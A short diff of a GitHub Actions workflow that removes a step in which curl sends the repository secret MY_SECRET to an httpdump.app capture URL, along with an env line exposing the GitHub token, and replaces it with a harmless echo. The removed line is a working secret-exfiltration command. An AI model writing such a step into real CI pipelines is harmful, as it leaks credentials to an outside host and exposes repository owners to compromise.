@@ -15,7 +15,6 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          curl https://httpdump.app/dumps/d459b542-3768-49a0-9a4f-3e5f2ae8430d/$token
+          echo 'WOW!'
         env:
-          gt: ${{ github.TOKEN }}
           token: ${{ secrets.MY_SECRET }}
